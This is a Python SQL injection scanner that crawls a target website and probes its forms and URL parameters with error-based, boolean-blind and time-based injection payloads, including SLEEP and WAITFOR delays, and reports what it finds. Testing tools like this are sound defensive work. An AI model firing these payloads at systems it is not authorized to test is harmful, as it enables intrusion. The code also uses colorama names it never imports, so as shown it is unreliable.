
"""
SQL Injection Scanner
Detects various SQL injection vulnerabilities
Supports: Error-based, Union-based, Boolean-based, Time-based blind
Developed by kakashi-kx
Based on OWASP testing guide 
"""

import requests
from urllib.parse import urljoin, urlparse, quote
from bs4 import BeautifulSoup
import time
import threading
from queue import Queue

class SQLInjectionScanner:
    def __init__(self, target, threads=10, timeout=5, user_agent=None):
        self.target = self.normalize_url(target)
        self.threads = threads
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': user_agent or 'Mozilla/5.0 (AION Security Scanner)'
        })
        self.vulnerabilities = []
        self.forms = []
        self.urls = set()
        
    def normalize_url(self, url):
        """Ensure URL has protocol"""
        if not url.startswith(('http://', 'https://')):
            return 'http://' + url
        return url
    
    def crawl(self, max_pages=50):
        """Crawl website to find all pages and forms"""
        print(f"  🕷️ Crawling {self.target}...")
        
        to_visit = {self.target}
        visited = set()
        
        while to_visit and len(visited) < max_pages:
            url = to_visit.pop()
            if url in visited:
                continue
            
            try:
                response = self.session.get(url, timeout=self.timeout)
                visited.add(url)
                
                # Extract links
                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all('a', href=True):
                    href = urljoin(url, link['href'])
                    if href.startswith(self.target) and href not in visited:
                        to_visit.add(href)
                
                # Extract forms
                for form in soup.find_all('form'):
                    self.forms.append({
                        'url': url,
                        'form': form
                    })
                
                print(f"    Found {len(self.forms)} forms so far...")
                
            except Exception as e:
                print(f"    Error crawling {url}: {e}")
        
        print(f"  ✅ Crawled {len(visited)} pages, found {len(self.forms)} forms")
    
    def test_error_based(self, url, params, method='get'):
        """Test for error-based SQL injection"""
        payloads = [
            "'",
            "\"",
            "';",
            "--",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "\" OR \"1\"=\"1",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "admin'--",
            "admin' #",
            "' WAITFOR DELAY '00:00:05'--",
            "'; WAITFOR DELAY '00:00:05'--",
            "1' ORDER BY 1--",
            "1' ORDER BY 100--"
        ]
        
        error_patterns = [
            "SQL syntax",
            "mysql_fetch",
            "ORA-",
            "PostgreSQL",
            "SQLite",
            "Unclosed quotation mark",
            "Microsoft OLE DB",
            "Incorrect syntax near",
            "Warning: mysql",
            "Warning: mysqli",
            "supplied argument is not a valid MySQL",
            "Division by zero",
            "Unterminated string",
            "SQL command not properly ended"
        ]
        
        for payload in payloads:
            test_params = params.copy()
            for param in test_params:
                test_params[param] = payload
            
            try:
                if method == 'post':
                    response = self.session.post(url, data=test_params, timeout=self.timeout)
                else:
                    response = self.session.get(url, params=test_params, timeout=self.timeout)
                
                response_text = response.text.lower()
                
                for pattern in error_patterns:
                    if pattern.lower() in response_text:
                        return True, payload, pattern
                        
            except Exception as e:
                continue
        
        return False, None, None
    
    def test_blind_boolean(self, url, params, method='get'):
        """Test for boolean-based blind SQL injection"""
        base_params = params.copy()
        
        # Test with true condition
        true_payload = "' OR '1'='1"
        test_params = base_params.copy()
        for param in test_params:
            test_params[param] = true_payload
        
        try:
            if method == 'post':
                true_response = self.session.post(url, data=test_params, timeout=self.timeout)
            else:
                true_response = self.session.get(url, params=test_params, timeout=self.timeout)
            
            # Test with false condition
            false_payload = "' AND '1'='2"
            test_params = base_params.copy()
            for param in test_params:
                test_params[param] = false_payload
            
            if method == 'post':
                false_response = self.session.post(url, data=test_params, timeout=self.timeout)
            else:
                false_response = self.session.get(url, params=test_params, timeout=self.timeout)
            
            # Check if responses differ significantly
            if len(true_response.text) != len(false_response.text):
                return True, true_payload, "Boolean-based blind"
                
        except Exception as e:
            pass
        
        return False, None, None
    
    def test_time_based(self, url, params, method='get'):
        """Test for time-based blind SQL injection"""
        base_params = params.copy()
        
        # MySQL time-based
        payloads = [
            "' OR SLEEP(5)--",
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "1' AND SLEEP(5)--",
            "' OR pg_sleep(5)--"
        ]
        
        for payload in payloads:
            test_params = base_params.copy()
            for param in test_params:
                test_params[param] = payload
            
            start_time = time.time()
            
            try:
                if method == 'post':
                    self.session.post(url, data=test_params, timeout=10)
                else:
                    self.session.get(url, params=test_params, timeout=10)
            except requests.Timeout:
                # Timeout might indicate injection
                elapsed = time.time() - start_time
                if elapsed >= 4:  # Close to our 5-second delay
                    return True, payload, "Time-based blind"
            except:
                pass
        
        return False, None, None
    
    def scan_forms(self):
        """Scan all discovered forms"""
        print(f"\n  🔍 Testing {len(self.forms)} forms for SQL injection...")
        
        for i, form_data in enumerate(self.forms, 1):
            url = form_data['url']
            form = form_data['form']
            
            # Extract form details
            action = urljoin(url, form.get('action', ''))
            method = form.get('method', 'get').lower()
            
            inputs = []
            for input_tag in form.find_all('input'):
                input_name = input_tag.get('name')
                input_type = input_tag.get('type', 'text')
                if input_name and input_type in ['text', 'search', 'hidden']:
                    inputs.append(input_name)
            
            if not inputs:
                continue
            
            # Prepare parameters
            params = {name: 'test' for name in inputs}
            
            print(f"    Form {i}/{len(self.forms)}: Testing {len(inputs)} parameters")
            
            # Test for error-based SQLi
            vuln, payload, pattern = self.test_error_based(action, params, method)
            if vuln:
                vuln_data = {
                    'type': 'SQL Injection (Error-based)',
                    'url': action,
                    'method': method.upper(),
                    'parameters': inputs,
                    'payload': payload,
                    'evidence': pattern,
                    'severity': 'Critical'
                }
                self.vulnerabilities.append(vuln_data)
                print(f"      {Fore.RED}⚠️  CRITICAL: SQL Injection found!{Style.RESET_ALL}")
                continue
            
            # Test for boolean-based blind
            vuln, payload, pattern = self.test_blind_boolean(action, params, method)
            if vuln:
                vuln_data = {
                    'type': 'SQL Injection (Boolean Blind)',
                    'url': action,
                    'method': method.upper(),
                    'parameters': inputs,
                    'payload': payload,
                    'severity': 'High'
                }
                self.vulnerabilities.append(vuln_data)
                print(f"      {Fore.RED}⚠️  HIGH: Blind SQL Injection found!{Style.RESET_ALL}")
                continue
            
            # Test for time-based blind
            vuln, payload, pattern = self.test_time_based(action, params, method)
            if vuln:
                vuln_data = {
                    'type': 'SQL Injection (Time Blind)',
                    'url': action,
                    'method': method.upper(),
                    'parameters': inputs,
                    'payload': payload,
                    'severity': 'High'
                }
                self.vulnerabilities.append(vuln_data)
                print(f"      {Fore.RED}⚠️  HIGH: Time-based SQL Injection found!{Style.RESET_ALL}")
    
    def scan_url_params(self):
        """Scan URL parameters for SQL injection"""
        parsed = urlparse(self.target)
        if not parsed.query:
            return
        
        params = {}
        for param in parsed.query.split('&'):
            if '=' in param:
                key, value = param.split('=', 1)
                params[key] = value
        
        if params:
            print(f"\n  🔍 Testing {len(params)} URL parameters for SQL injection...")
            
            # Test for error-based
            vuln, payload, pattern = self.test_error_based(self.target, params, 'get')
            if vuln:
                vuln_data = {
                    'type': 'SQL Injection (URL Parameter)',
                    'url': self.target,
                    'parameters': list(params.keys()),
                    'payload': payload,
                    'evidence': pattern,
                    'severity': 'Critical'
                }
                self.vulnerabilities.append(vuln_data)
    
    def scan(self):
        """Main scan function"""
        print(f"\n{Fore.CYAN}🌐 Starting SQL Injection Scan on {self.target}{Style.RESET_ALL}")
        
        # Crawl the website
        self.crawl()
        
        # Scan forms
        if self.forms:
            self.scan_forms()
        
        # Scan URL parameters
        self.scan_url_params()
        
        # Summary
        print(f"\n{Fore.CYAN}📊 SQL Injection Scan Complete{Style.RESET_ALL}")
        print(f"  Total vulnerabilities found: {len(self.vulnerabilities)}")
        
        if self.vulnerabilities:
            for vuln in self.vulnerabilities:
                severity_color = Fore.RED if vuln['severity'] == 'Critical' else Fore.YELLOW
                print(f"  {severity_color}• [{vuln['severity']}] {vuln['type']} at {vuln['url']}{Style.RESET_ALL}")
        
        return self.vulnerabilities
